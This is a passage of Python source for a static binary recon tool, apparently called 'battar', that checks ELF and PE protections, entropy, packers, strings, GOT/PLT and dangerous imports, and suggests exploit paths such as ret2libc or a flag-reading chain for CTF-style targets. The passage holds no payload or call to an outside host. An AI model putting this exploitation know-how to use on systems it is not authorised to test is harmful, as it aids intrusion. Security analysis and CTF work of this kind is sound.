    pattern = re.compile(rb"[\x20-\x7e\t]{%d,}" % max(1, min_len))
    return [(m.start(), m.group().decode("ascii", errors="ignore")) for m in pattern.finditer(data)]


FLAG_FILENAME_PATTERN = re.compile(r"(?i)\bflag[\w./-]{0,20}\b")


def find_flag_filename(path, elf, min_len=3):
    """Look for a CTF-style 'flag' filename string in the binary and resolve
    its real virtual address (not just the raw file offset)."""
    try:
        rows = extract_strings(path, min_len=min_len)
    except Exception:
        return None, None
    candidates = sorted(
        (text for _, text in rows if len(text) <= 40 and FLAG_FILENAME_PATTERN.search(text)),
        key=len,
    )
    for text in candidates:
        for needle in (text.encode() + b"\x00", text.encode()):
            try:
                addr = next(elf.search(needle))
                return addr, text
            except StopIteration:
                continue
    return None, None


def show_strings(rows, args):
    banner("STRINGS")
    if not rows:
        print(f"  {C.YELLOW}No printable strings found (min length {args.min_len}){C.RESET}")
        return

    total = len(rows)
    shown = rows if args.all else rows[:args.limit]
    print(f"  {C.BOLD}{'Offset':<14}{'String'}{C.RESET}")
    print(f"  {C.GRAY}{'-' * 60}{C.RESET}")
    for offset, text in shown:
        display = text if len(text) <= 100 else text[:97] + "..."
        print(f"  {C.BOLD}{C.CYAN}0x{offset:08x}{C.RESET}    {C.BOLD}{display}{C.RESET}")
    if not args.all and total > args.limit:
        remaining_note(total - args.limit, args.limit)
    note(f"min length: {args.min_len} (use --min-len N to change)")


# ───────────────────────────── ELF ─────────────────────────────

def analyze_elf(path, sections, args, summary):
    try:
        from pwn import ELF, context
    except ImportError:
        print(f"{C.RED}[!] pwntools is not installed. Install with: pip install pwntools{C.RESET}")
        sys.exit(1)

    context.log_level = "error"

    try:
        elf = ELF(path, checksec=False)
    except Exception as e:
        print(f"{C.RED}[!] Failed to load binary as ELF: {e}{C.RESET}")
        sys.exit(1)

    banner("PROTECTIONS (checksec)")

    nx_color = C.GREEN if elf.nx else C.RED
    kv("NX", "Enabled" if elf.nx else "Disabled", nx_color)
    note("Stack is non-executable, need ROP/ret2libc instead of direct shellcode" if elf.nx
         else "Stack is executable, shellcode can be placed and run directly")

    pie_color = C.GREEN if elf.pie else C.RED
    kv("PIE", "Enabled" if elf.pie else "Disabled", pie_color)
    note("Addresses are randomized each run, need an info-leak before any jump" if elf.pie
         else "Addresses are fixed (static base), can target addresses directly without a leak")
    if elf.pie:
        kv("PIE Base", f"0x{elf.address:x}", C.CYAN)
        note("Static/default base as loaded from disk (0x0 unless mapped) — real runtime base needs a leak")

    canary_color = C.GREEN if elf.canary else C.RED
    kv("Canary", "Enabled" if elf.canary else "Disabled", canary_color)
    note("A guard value sits before the return address, need a leak or bypass" if elf.canary
         else "No protection on the return address, a classic buffer overflow may work directly")

    relro_val = elf.relro if elf.relro else "None"
    if elf.relro == "Full":
        relro_color = C.GREEN
        relro_note = "GOT is fully read-only after linking, GOT overwrite is not possible"
    elif elf.relro == "Partial":
        relro_color = C.YELLOW
        relro_note = "Part of the GOT is writable, check which entries are still open"
    else:
        relro_color = C.RED
        relro_note = "GOT is fully writable, GOT overwrite is a direct exploitation path"
    kv("RELRO", str(relro_val), relro_color)
    note(relro_note)

    stripped_color = C.YELLOW if elf.stripped else C.RESET
    kv("Stripped", "Yes" if elf.stripped else "No", stripped_color)
    note("No function names available, you'll rely on addresses and patterns only" if elf.stripped
         else "Function names are available, analysis is much easier")

    summary["format"] = "ELF"
    summary["nx"] = bool(elf.nx)
    summary["pie"] = bool(elf.pie)
    summary["canary"] = bool(elf.canary)
    summary["relro"] = str(relro_val)
    summary["stripped"] = bool(elf.stripped)

    try:
        fortify_color = C.GREEN if elf.fortify else C.RED
        kv("Fortify", "Enabled" if elf.fortify else "Disabled", fortify_color)
    except AttributeError:
        pass

    kv("Arch", f"{elf.arch} ({elf.bits}-bit, {elf.endian})", C.BLUE)

    if "build" in sections:
        show_build_info_elf(path, elf)

    section_entropies = {}
    overall_entropy = None
    has_sections = True
    if "packer" in sections or "entropy" in sections:
        num_sections = 0
        for sec in elf.iter_sections():
            num_sections += 1
            if sec.name and sec.header.sh_size:
                try:
                    data = sec.data()
                except Exception:
                    continue
                if data:
                    section_entropies[sec.name] = shannon_entropy(data)
        has_sections = num_sections > 0
        with open(path, "rb") as f:
            overall_entropy = shannon_entropy(f.read())

    if "packer" in sections:
        findings = detect_packer(list(section_entropies.keys()), section_entropies, is_pe=False,
                                  overall_entropy=overall_entropy, has_sections=has_sections)
        show_packer(findings, summary=summary)

    if "entropy" in sections:
        show_entropy(overall_entropy, section_entropies, args, summary=summary)

    funcs = elf.functions

    if "functions" in sections:
        banner("FUNCTIONS")
        if not funcs:
            print(f"  {C.YELLOW}No functions available (likely stripped){C.RESET}")
        else:
            rows = sorted(funcs.items(), key=lambda x: x[1].address)
            total = len(rows)
            shown = rows if args.all else rows[:args.limit]
            print(f"  {C.BOLD}{'Address':<20}{'Size':<10}{'Name'}{C.RESET}")
            print(f"  {C.GRAY}{'-' * 60}{C.RESET}")
            for name, f in shown:
                width = 8 if elf.bits == 32 else 16
                addr_str = f"0x{f.address:0{width}x}"
                styled = f"{C.BOLD}{C.CYAN}{addr_str}{C.RESET}"
                pad = 20 + len(C.BOLD) + len(C.CYAN) + len(C.RESET)
                print(f"  {styled:<{pad}}{C.BOLD}{f.size:<10}{name}{C.RESET}")
            if not args.all and total > args.limit:
                remaining_note(total - args.limit, args.limit)

    string_rows = None
    if "strings" in sections or "interesting" in sections:
        string_rows = extract_strings(path, min_len=args.min_len)

    if "strings" in sections:
        show_strings(string_rows, args)

    if "interesting" in sections:
        show_interesting_strings(string_rows, args, summary=summary)

    if "symbols" in sections:
        banner("SYMBOLS")
        syms = elf.symbols
        if not syms:
            print(f"  {C.YELLOW}No symbols found{C.RESET}")
        else:
            rows = sorted(syms.items(), key=lambda x: x[1])
            total = len(rows)
            shown = rows if args.all else rows[:args.limit]
            print(f"  {C.BOLD}{'Address':<20}{'Name'}{C.RESET}")
            print(f"  {C.GRAY}{'-' * 60}{C.RESET}")
            for name, addr in shown:
                addr_line(addr, name, bits=elf.bits, funcs=funcs)
            if not args.all and total > args.limit:
                remaining_note(total - args.limit, args.limit)

    if "dangerous" in sections:
        name_set = set(elf.plt.keys()) | set(elf.symbols.keys())
        show_dangerous_functions(name_set, args, summary=summary)

    if "exploit" in sections:
        show_exploit_helper(path, elf, args, summary=summary)

    if "gadgets" in sections:
        try:
            libc_for_gadgets = elf.libc
        except Exception:
            libc_for_gadgets = None
        show_gadgets(elf, args, libc=libc_for_gadgets, summary=summary)

    if "plt" in sections:
        banner("PLT (Procedure Linkage Table)")
        plt = elf.plt
        if plt:
            rows = sorted(plt.items(), key=lambda x: x[1])
            total = len(rows)
            shown = rows if args.all else rows[:args.limit]
            print(f"  {C.BOLD}{'Address':<20}{'Name'}{C.RESET}")
            print(f"  {C.GRAY}{'-' * 60}{C.RESET}")
            for name, addr in shown:
                addr_line(addr, name, bits=elf.bits, funcs=funcs)
            if not args.all and total > args.limit:
                remaining_note(total - args.limit, args.limit)
        else:
            print(f"  {C.YELLOW}No PLT entries (likely a static binary){C.RESET}")

    if "got" in sections:
        banner("GOT (Global Offset Table)")
        got = elf.got
        if got:
            rows = sorted(got.items(), key=lambda x: x[1])
            total = len(rows)
            shown = rows if args.all else rows[:args.limit]
            print(f"  {C.BOLD}{'Address':<20}{'Name'}{C.RESET}")
            print(f"  {C.GRAY}{'-' * 60}{C.RESET}")
            for name, addr in shown:
                addr_line(addr, name, color=C.MAGENTA, bits=elf.bits, funcs=funcs)
            if not args.all and total > args.limit:
                remaining_note(total - args.limit, args.limit)
        else:
            print(f"  {C.YELLOW}No GOT entries{C.RESET}")


# ───────────────────────────── PE ─────────────────────────────

def analyze_pe(path, sections, args, summary):
    try:
        import pefile
    except ImportError:
        print(f"{C.RED}[!] pefile is not installed. Install with: pip install pefile{C.RESET}")
        sys.exit(1)

    try:
        pe = pefile.PE(path)
    except Exception as e:
        print(f"{C.RED}[!] Failed to load binary as PE: {e}{C.RESET}")
        sys.exit(1)

    banner("PROTECTIONS (PE)")

    dll_char = pe.OPTIONAL_HEADER.DllCharacteristics
    is_64 = pe.OPTIONAL_HEADER.Magic == 0x20B

    aslr = bool(dll_char & 0x0040)          # DYNAMIC_BASE
    dep = bool(dll_char & 0x0100)           # NX_COMPAT
    high_entropy = bool(dll_char & 0x0020)  # HIGH_ENTROPY_VA
    no_seh = bool(dll_char & 0x0400)        # NO_SEH
    cfg = bool(dll_char & 0x4000)           # GUARD_CF

    aslr_color = C.RESET if aslr else C.RED
    kv("ASLR (Dynamic Base)", "Enabled" if aslr else "Disabled", aslr_color, key_width=26)
    note("Addresses are randomized each run, need an info-leak before any jump" if aslr
         else "Addresses are fixed, direct targeting is possible without a leak")

    dep_color = C.RESET if dep else C.RED
    kv("DEP/NX", "Enabled" if dep else "Disabled", dep_color, key_width=26)
    note("Stack/heap are non-executable, need ROP instead of direct shellcode" if dep
         else "Shellcode can be executed directly in writable memory")

    if is_64:
        he_color = C.RESET if high_entropy else C.RED
        kv("High-Entropy ASLR", "Enabled" if high_entropy else "Disabled", he_color, key_width=26)
        note("Full 64-bit address randomization, much larger brute-force space" if high_entropy
             else "Weaker ASLR randomization even though ASLR is on")

    cfg_color = C.RESET if cfg else C.RED
    kv("CFG (Control Flow Guard)", "Enabled" if cfg else "Disabled", cfg_color, key_width=26)
    note("Validates every indirect call target, makes ROP/JOP harder" if cfg
         else "No validation on indirect calls, an easier exploitation path")

    kv("SEH Usage", "Not Used" if no_seh else "Uses SEH", C.BLUE, key_width=26)
    if not no_seh:
        note("Program uses SEH — verify SafeSEH/SEHOP with a tool like mona.py before attempting SEH overwrite")

    kv("Machine", "x64" if is_64 else "x86", C.BLUE, key_width=26)
    kv("Entry Point", f"0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase:x}", C.BLUE, key_width=26)
    kv("Image Base", f"0x{pe.OPTIONAL_HEADER.ImageBase:x}", C.BLUE, key_width=26)

    summary["format"] = "PE"
    summary["aslr"] = aslr
    summary["dep"] = dep
    summary["cfg"] = cfg

    if "build" in sections:
        show_build_info_pe(pe)

    section_entropies = {}
    overall_entropy = None
    import_count = 0
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            import_count += len(entry.imports)

    if "packer" in sections or "entropy" in sections:
        for sec in pe.sections:
            name = sec.Name.decode(errors="ignore").strip("\x00")
            try:
                section_entropies[name] = sec.get_entropy()
            except Exception:
                pass
        with open(path, "rb") as f:
            overall_entropy = shannon_entropy(f.read())

    if "packer" in sections:
        raw_names = [sec.Name.decode(errors="ignore") for sec in pe.sections]
        findings = detect_packer(raw_names, section_entropies, is_pe=True, import_count=import_count)
        show_packer(findings, summary=summary)

    if "entropy" in sections:
        show_entropy(overall_entropy, section_entropies, args, summary=summary)

    if "sections" in sections:
        banner("SECTIONS")
        rows = list(pe.sections)
        total = len(rows)
        shown = rows if args.all else rows[:args.limit]
        print(f"  {C.BOLD}{'Name':<12}{'VirtAddr':<14}{'VirtSize':<12}{'Perms'}{C.RESET}")
        print(f"  {C.GRAY}{'-' * 55}{C.RESET}")
        for sec in shown:
            name = sec.Name.decode(errors="ignore").strip("\x00")
            vaddr = sec.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
            vsize = sec.Misc_VirtualSize
            r = "R" if sec.IMAGE_SCN_MEM_READ else "-"
            w = "W" if sec.IMAGE_SCN_MEM_WRITE else "-"
            x = "X" if sec.IMAGE_SCN_MEM_EXECUTE else "-"
            perms = r + w + x
            perm_color = C.RED if (w == "W" and x == "X") else (C.YELLOW if x == "X" else C.RESET)
            print(f"  {name:<12}0x{vaddr:<12x}{vsize:<12}{perm_color}{perms}{C.RESET}")
        if not args.all and total > args.limit:
            remaining_note(total - args.limit, args.limit)

    string_rows = None
    if "strings" in sections or "interesting" in sections:
        string_rows = extract_strings(path, min_len=args.min_len)

    if "strings" in sections:
        show_strings(string_rows, args)

    if "interesting" in sections:
        show_interesting_strings(string_rows, args, summary=summary)

    if "imports" in sections:
        banner("IMPORTS (IAT) — by DLL")
        if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode(errors="ignore")
                print(f"\n  {C.BOLD}{C.BLUE}[{dll_name}]{C.RESET}")
                rows = list(entry.imports)
                total = len(rows)
                shown = rows if args.all else rows[:args.limit]
                for imp in shown:
                    name = imp.name.decode(errors="ignore") if imp.name else f"Ordinal_{imp.ordinal}"
                    if imp.address:
                        addr_line(imp.address, name, bits=64 if is_64 else 32)
                if not args.all and total > args.limit:
                    remaining_note(total - args.limit, args.limit)
        else:
            print(f"  {C.YELLOW}No imports found{C.RESET}")

    if "dangerous" in sections:
        name_set = set()
        if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name:
                        name_set.add(imp.name.decode(errors="ignore"))
        show_dangerous_functions(name_set, args, summary=summary)

    if "exploit" in sections:
        banner("EXPLOIT HELPER (ret2libc / ret2system)")
        print(f"  {C.YELLOW}ret2system/ret2libc chains are a Linux ELF concept and don't apply "
              f"to PE binaries — for Windows this would be a ROP/shellcode chain instead{C.RESET}")

    if "gadgets" in sections:
        banner("ROP GADGETS")
        print(f"  {C.YELLOW}The byte-pattern gadget search here targets x86/x64 System V calling "
              f"convention gadgets; for Windows ROP chains use a dedicated tool like ropper "
              f"against this PE{C.RESET}")

    if "exports" in sections:
        banner("EXPORTS")
        if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
            base = pe.OPTIONAL_HEADER.ImageBase
            rows = list(pe.DIRECTORY_ENTRY_EXPORT.symbols)
            total = len(rows)
            shown = rows if args.all else rows[:args.limit]
            for exp in shown:
                name = exp.name.decode(errors="ignore") if exp.name else f"Ordinal_{exp.ordinal}"
                addr_line(base + exp.address, name, color=C.MAGENTA, bits=64 if is_64 else 32)
            if not args.all and total > args.limit:
                remaining_note(total - args.limit, args.limit)
        else:
            print(f"  {C.YELLOW}No exports (normal for a regular EXE, expected for a DLL){C.RESET}")


# ───────────────────────────── MAIN ─────────────────────────────

def compute_risk_verdict(summary):
    """Shared scoring logic used by both the text RISK SUMMARY and --json
    output, so the two never drift out of sync."""
    fmt = summary.get("format", "?")
    score = 0

    if fmt == "ELF":
        if not summary.get("nx"):
            score += 2
        if not summary.get("pie"):
            score += 1
        if not summary.get("canary"):
            score += 2
        relro = summary.get("relro")
        if relro is not None and relro != "Full":
            score += 1
    elif fmt == "PE":
        if not summary.get("aslr"):
            score += 1
        if not summary.get("dep"):
            score += 2
        if not summary.get("cfg"):
            score += 1

    if "entropy" in summary and summary["entropy"] >= 7.2:
        score += 1
    if summary.get("packer_findings"):
        score += 2
    if "dangerous_count" in summary:
        sev_points = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1, "LOW": 0}
        score += sev_points.get(summary.get("dangerous_top"), 0)
    if summary.get("interesting_count"):
        score += 1
    strat = summary.get("exploit_strategy")
    if strat == "A":
        score += 2
    elif strat in ("B", "C", "D"):
        score += 1

    if score <= 2:
        verdict = "LOW"
    elif score <= 5:
        verdict = "MEDIUM"
    else:
        verdict = "HIGH"
    return score, verdict


def build_json_report(path, summary):
    """A clean, machine-readable dict for --json — meant to be piped
    straight into a pentest-report generator or another tool."""
    score, verdict = compute_risk_verdict(summary)
    exploit_labels = {
        "A": "ret2system (direct, no leak)",
        "B": "ret2libc (leak needed)",
        "C": "execve syscall chain (no libc needed)",
        "D": "open/read/write flag chain (no libc needed)",
        None: None,
    }
    report = {
        "file": os.path.abspath(path),
        "format": summary.get("format"),
        "protections": {},
        "risk": {
            "score": score,
            "verdict": verdict,
        },
    }

    if summary.get("format") == "ELF":
        report["protections"] = {
            "nx": summary.get("nx"),
            "pie": summary.get("pie"),
            "canary": summary.get("canary"),
            "relro": summary.get("relro"),
            "stripped": summary.get("stripped"),
        }
    elif summary.get("format") == "PE":
        report["protections"] = {
            "aslr": summary.get("aslr"),
            "dep": summary.get("dep"),
            "cfg": summary.get("cfg"),
        }

    if "entropy" in summary:
        report["entropy"] = summary["entropy"]
    if "packer_findings" in summary:
        report["packer_findings"] = summary["packer_findings"]
    if "dangerous_count" in summary:
        report["dangerous_functions"] = {
            "count": summary["dangerous_count"],
            "highest_severity": summary.get("dangerous_top"),
        }
    if "interesting_count" in summary:
        report["interesting_strings"] = summary["interesting_count"]
    if "gadgets_found" in summary:
        report["gadgets_found"] = summary["gadgets_found"]
    if "exploit_strategy" in summary:
        strat = summary["exploit_strategy"]
        report["exploit"] = {
            "strategy": strat,
            "description": exploit_labels.get(strat),
        }

    return report


def show_summary(summary):
    banner("RISK SUMMARY")

    fmt = summary.get("format", "?")
    print(f"  {C.BOLD}{C.GRAY}{'Format':<18}{C.RESET}{C.BOLD}{C.BLUE}{fmt}{C.RESET}")

    if fmt == "ELF":
        checks = [
            ("NX", summary.get("nx"), 2),
            ("PIE", summary.get("pie"), 1),
            ("Canary", summary.get("canary"), 2),
        ]
        for label, enabled, penalty in checks:
            mark = f"{C.GREEN}✓ Enabled{C.RESET}" if enabled else f"{C.RED}✗ Disabled{C.RESET}"
            print(f"  {C.BOLD}{C.GRAY}{label:<18}{C.RESET}{mark}")
        relro = summary.get("relro")
        if relro is not None:
            relro_color = C.GREEN if relro == "Full" else (C.YELLOW if relro == "Partial" else C.RED)
            print(f"  {C.BOLD}{C.GRAY}{'RELRO':<18}{C.RESET}{relro_color}{relro}{C.RESET}")
        if summary.get("stripped"):
            print(f"  {C.BOLD}{C.GRAY}{'Stripped':<18}{C.RESET}{C.YELLOW}Yes{C.RESET}")

    elif fmt == "PE":
        checks = [
            ("ASLR", summary.get("aslr"), 1),
            ("DEP/NX", summary.get("dep"), 2),
            ("CFG", summary.get("cfg"), 1),
        ]
        for label, enabled, penalty in checks:
            mark = f"{C.GREEN}✓ Enabled{C.RESET}" if enabled else f"{C.RED}✗ Disabled{C.RESET}"
            print(f"  {C.BOLD}{C.GRAY}{label:<18}{C.RESET}{mark}")

    if "entropy" in summary:
        overall = summary["entropy"]
        print(f"  {C.BOLD}{C.GRAY}{'Entropy':<18}{C.RESET}{entropy_bar(overall, width=16)} "
              f"{overall:.2f}/8.00")

    if "packer_findings" in summary:
        count = summary["packer_findings"]
        color = C.RED if count else C.GREEN
        print(f"  {C.BOLD}{C.GRAY}{'Packer signals':<18}{C.RESET}{color}{count} finding(s){C.RESET}")

    if "dangerous_count" in summary:
        count = summary["dangerous_count"]
        top = summary.get("dangerous_top")
        color = C.GREEN if count == 0 else C.RED
        extra = f"  (highest: {badge(top)})" if top else ""
        print(f"  {C.BOLD}{C.GRAY}{'Dangerous funcs':<18}{C.RESET}{color}{count} found{C.RESET}{extra}")

    if "interesting_count" in summary:
        count = summary["interesting_count"]
        color = C.YELLOW if count else C.GREEN
        print(f"  {C.BOLD}{C.GRAY}{'Interesting hits':<18}{C.RESET}{color}{count} flagged{C.RESET}")

    if "exploit_strategy" in summary:
        strat = summary["exploit_strategy"]
        label = {"A": "ret2system (direct, no leak)", "B": "ret2libc (leak needed)",
                  "C": "execve syscall chain", "D": "open/read/write flag chain",
                  None: "none found"}.get(strat, "none found")
        color = C.RED if strat == "A" else (C.YELLOW if strat in ("B", "C", "D") else C.GREEN)
        print(f"  {C.BOLD}{C.GRAY}{'Exploit path':<18}{C.RESET}{color}{label}{C.RESET}")

    score, verdict = compute_risk_verdict(summary)
    vcolor = {"LOW": C.GREEN, "MEDIUM": C.YELLOW, "HIGH": C.RED}[verdict]

    print(f"\n  {C.BOLD}{C.GRAY}{'Overall verdict':<18}{C.RESET}{C.BOLD}{vcolor}[ {verdict} RISK ]{C.RESET}")
    note("Score only reflects the sections you actually ran — add --section entropy packer "
         "dangerous interesting for a fuller picture")


def _positive_int(min_value=0):
    def validator(value):
        try:
            ivalue = int(value)
        except ValueError:
            raise argparse.ArgumentTypeError(f"{value!r} is not an integer")
        if ivalue < min_value:
            raise argparse.ArgumentTypeError(f"must be >= {min_value}, got {ivalue}")
        return ivalue
    return validator


def parse_args():
    parser = argparse.ArgumentParser(
        prog="battar",
        description="Quick static recon for ELF & PE (exe) binaries"
    )
    parser.add_argument("binary", help="Path to the binary to analyze")
    parser.add_argument(
        "--section", "--sections", dest="section", nargs="+", metavar="NAME",
        choices=ALL_SECTIONS,
        help=f"Only show these listing sections. Choices: {', '.join(ALL_SECTIONS)}. "
             f"(file info & protections always print)"
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Show every entry in listing sections (no truncation)"
    )
    parser.add_argument(
        "--limit", type=_positive_int(0), default=DEFAULT_LIMIT, metavar="N",
        help=f"Max rows to show per listing section before truncating (default: {DEFAULT_LIMIT})"
    )
    parser.add_argument(
        "--min-len", type=_positive_int(1), default=4, metavar="N",
        help="Minimum length for the strings section (default: 4)"
    )
    parser.add_argument(
        "--auto-offset", action="store_true",
        help="DYNAMIC: actually run the target locally with a cyclic pattern to auto-detect the "
             "overflow OFFSET for --section exploit. Off by default — only enable this for "
             "binaries you trust/intend to test, since it executes the file."
    )
    parser.add_argument(
        "--auto-offset-timeout", type=_positive_int(1), default=5, metavar="SECONDS",
        help="How long to wait for the target to crash during --auto-offset (default: 5)"
    )
    parser.add_argument(
        "--json", action="store_true",
        help="Print the risk summary as a single JSON object instead of colored terminal "
             "output — for piping into a report generator or another tool"
    )
    return parser.parse_args()


def main():
    args = parse_args()

    if not args.json:
        intro_banner()

    path = args.binary
    if not os.path.isfile(path):
        if args.json:
            print(json.dumps({"error": f"file not found: {path}"}, indent=2))
        else:
            print(f"{C.RED}[!] File not found: {path}{C.RESET}")
        sys.exit(1)

    sections = set(args.section) if args.section else set(ALL_SECTIONS)

    real_stdout = sys.stdout
    anim = _CuttingAnimation(os.path.basename(path), real_stream=real_stdout)
    exit_code = None

    # A real (tempfile-backed) stream, not io.StringIO — pwntools needs a
    # genuine file descriptor (.fileno()) for some of its terminal setup.
    tmp = tempfile.TemporaryFile(mode="w+", encoding="utf-8")
    captured = ""
    summary = {}

    if not args.json:
        anim.start()
    try:
        with contextlib.redirect_stdout(tmp):
            print(f"{C.BOLD}{C.YELLOW}battar — {os.path.basename(path)}{C.RESET}")

            get_file_info(path)

            ftype = detect_filetype(path)
            if ftype == "ELF":
                analyze_elf(path, sections, args, summary)
            elif ftype == "PE":
                analyze_pe(path, sections, args, summary)
            else:
                print(f"{C.RED}[!] Unsupported format — this tool only supports ELF and PE (exe).{C.RESET}")
                raise SystemExit(1)

            show_summary(summary)
            print(f"\n{C.GREEN}[+] Recon completed.{C.RESET}\n")
    except SystemExit as e:
        exit_code = e.code
    finally:
        try:
            tmp.seek(0)
            captured = tmp.read()
        except Exception:
            pass
        tmp.close()
        anim.stop()
        if args.json:
            if exit_code:
                print(json.dumps({"error": "unsupported format — only ELF and PE (exe) are supported"},
                                  indent=2))
            else:
                print(json.dumps(build_json_report(path, summary), indent=2))
        else:
            real_stdout.write(captured)
            real_stdout.flush()

    if exit_code:
        sys.exit(exit_code)


if __name__ == "__main__":
    main()
